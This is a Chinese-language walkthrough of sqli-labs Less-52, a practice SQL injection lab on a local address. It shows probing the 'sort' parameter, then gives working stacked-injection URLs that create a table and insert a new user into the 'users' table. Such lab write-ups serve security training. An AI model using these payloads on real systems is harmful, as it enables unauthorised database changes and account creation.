---
title: Less - 52
date: 2023-03-24T11:19:26Z
lastmod: 2023-03-24T12:54:23Z
---

# Less - 52

---

# 通关教程

---

## 1、判断闭合

---

```http
http://192.168.23.128/sqli-labs/Less-52/?sort=1'
```

​![image](assets/image-20230324112854-7mi2r1u.png)​

```http
http://192.168.23.128/sqli-labs/Less-52/?sort=1--+
http://192.168.23.128/sqli-labs/Less-52/?sort=1'--+
```

​![image](assets/image-20230324113021-3gynei7.png)​

因为这里没有完整错误回显，所以这里我们只能使用时间盲注，但是在本关中使用了mysgli multi guery()函数，而在less46-49关中使用了mysqL fetch_assoc()函数，所以这里我们也可以使用堆叠注入攻击。

---

## 2、创建一张表

---

```http
http://192.168.23.128/sqli-labs/Less-52/?sort=1;create table test like users;--+
```

​![image](assets/image-20230324124923-owe40vv.png)​

​![image](assets/image-20230324125013-cmex9qz.png)​

---

## 3、新建一个用户

---

```http
http://192.168.23.128/sqli-labs/Less-52/?sort=1;insert into users values(18,'cmx','cmx');--+
```

​![image](assets/image-20230324125243-7x6ivk7.png)​

​![image](assets/image-20230324125423-8rsw41b.png)​
